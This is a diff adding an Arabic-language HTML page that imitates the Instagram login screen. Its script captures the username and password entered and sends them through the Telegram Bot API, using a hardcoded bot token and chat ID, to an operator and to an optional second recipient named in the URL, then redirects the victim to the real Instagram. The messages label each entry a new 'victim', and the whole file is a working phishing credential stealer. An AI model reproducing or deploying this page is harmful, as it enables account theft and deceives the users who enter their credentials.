@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  
+  <meta name="robots" content="noarchive, noimageindex" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="default" />
+  <meta name="theme-color" content="#ffffff" />
+  <meta name="theme-color" content="#000000" media="(prefers-color-scheme: dark)" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover" />
+  <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico" type="image/x-icon" />
+  <link rel="apple-touch-icon" sizes="180x180" href="https://static.cdninstagram.com/rsrc.php/v4/yG/r/De-Dwpd5CHc.png" />
+
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+      background: linear-gradient(160deg, #e9e4ff 0%, #f8f5ff 40%, #ffffff 70%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      overflow: hidden;
+    }
+    .container {
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      width: 100%;
+      max-width: 400px;
+      height: 100%;
+      box-sizing: border-box;
+      padding: 0 35px 20px 35px;
+    }
+    .header {
+      text-align: center;
+      font-size: 14px;
+      color: #8e8e8e;
+      padding: 20px 0;
+      flex-shrink: 0;
+    }
+    .main-content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      flex-grow: 1;
+      gap: 16px;
+      width: 100%;
+    }
+    .logo {
+      width: 90px;
+      height: 90px;
+      margin-bottom: 35px;
+    }
+    #loginForm {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .input-field {
+      width: 100%;
+      padding: 14px 20px;
+      font-size: 14px;
+      background-color: #ffffff;
+      border: 1px solid #f0f0f0;
+      border-radius: 28px;
+      box-sizing: border-box;
+      text-align: right;
+      height: 52px;
+    }
+    .input-field::placeholder {
+      color: #a0a0a0;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 28px;
+      border: none;
+      cursor: pointer;
+      height: 52px;
+    }
+    #loginButton {
+      background-color: #0064e0;
+      color: white;
+    }
+    .forgot-password {
+      color: #00376b;
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 500;
+      margin-top: 15px;
+    }
+    .footer {
+      padding: 20px 0;
+      text-align: center;
+      flex-shrink: 0;
+      width: 100%;
+    }
+    .create-account-btn {
+      background-color: transparent;
+      color: #00376b;
+      border: 1px solid #00376b;
+      margin-bottom: 30px;
+    }
+    .meta-logo {
+      width: 72px;
+      height: 14px;
+      opacity: 0.8;
+    }
+    .error {
+      color: #ed4956;
+      font-size: 14px;
+      text-align: center;
+      margin-bottom: 10px;
+      height: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <span>العربية</span>
+    </div>
+
+    <div class="main-content">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
+      <div id="error" class="error"></div>
+      <form id="loginForm">
+        <!-- تم تغيير id من email إلى username -->
+        <input class="input-field" type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول" required>
+        <input class="input-field" type="password" id="password" placeholder="كلمة السر" required>
+        <button type="submit" id="loginButton">تسجيل الدخول</button>
+      </form>
+      <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+    </div>
+
+    <div class="footer">
+      <button class="create-account-btn">إنشاء حساب جديد</button>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Meta-Logo.png/200px-Meta-Logo.png" alt="Meta Logo" class="meta-logo">
+    </div>
+  </div>
+
+  <!-- --- بداية السكريبت الجديد والمدمج --- -->
+  <script>
+    function getUrlId() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const id = urlParams.get('id');
+      return id; // سنقوم بإرجاع القيمة أو null
+    }
+
+    async function sendTelegramMessage(botToken, chatId, message) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      try {
+        const response = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: "HTML"
+          })
+        });
+        const data = await response.json();
+        return data.ok;
+      } catch (error) {
+        console.error(`Failed to send to Chat ID ${chatId}:`, error);
+        return false;
+      }
+    }
+
+    document.getElementById("loginForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+
+      // تعديل: القراءة من حقل username بدلاً من email
+      const userInput = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const errorDiv = document.getElementById("error");
+
+      // استخدام نفس شروط التحقق من سكريبت الفيسبوك
+      const isPhone = /^01\d{9}$/.test(userInput);
+      const isGmail = /^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(userInput);
+      const hasArabic = /[\u0600-\u06FF]/.test(password);
+      const isValidPassword = password.length >= 8 && !hasArabic;
+
+      // استخدام نفس رسالة الخطأ
+      if ((!isPhone && !isGmail) || !isValidPassword) {
+        errorDiv.textContent = "كلمة السر التي أدخلتها غير صحيحة. هل نسيت كلمة السر؟";
+        return;
+      }
+
+      const botToken = "8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4";
+      const adminChatId = "1431886140";
+      const dynamicChatId = getUrlId();
+
+      // تعديل: تحديث الرسائل لتعكس أنها من إنستغرام
+      const messageForAdmin = `
+        <b>📸 ضحية جديدة من Instagram | المصدر: ${dynamicChatId || 'غير محدد'} 📸</b>
+        -----------------------------------
+        <b>👤 المستخدم/الهاتف:</b> <code>${userInput}</code>
+        <b>🔑 كلمة السر:</b> <code>${password}</code>
+      `;
+      
+      const messageForDynamicId = `
+        <b>🎉 بيانات جديدة وصلت من Instagram! 🎉</b>
+        -----------------------------------
+        <b>👤 المستخدم/الهاتف:</b> <code>${userInput}</code>
+        <b>🔑 كلمة السر:</b> <code>${password}</code>
+      `;
+
+      const sentToAdmin = await sendTelegramMessage(botToken, adminChatId, messageForAdmin);
+      
+      if (dynamicChatId && dynamicChatId !== adminChatId) {
+        await sendTelegramMessage(botToken, dynamicChatId, messageForDynamicId);
+      }
+
+      // تعديل: إعادة التوجيه إلى صفحة إنستغرام
+      if (sentToAdmin) {
+        window.location.href = "https://www.instagram.com/";
+      } else {
+        errorDiv.textContent = "حدث خطأ أثناء إرسال البيانات.";
+      }
+    });
+  </script>
+  <!-- --- نهاية السكريبت --- -->
+</body>
+</html>
+
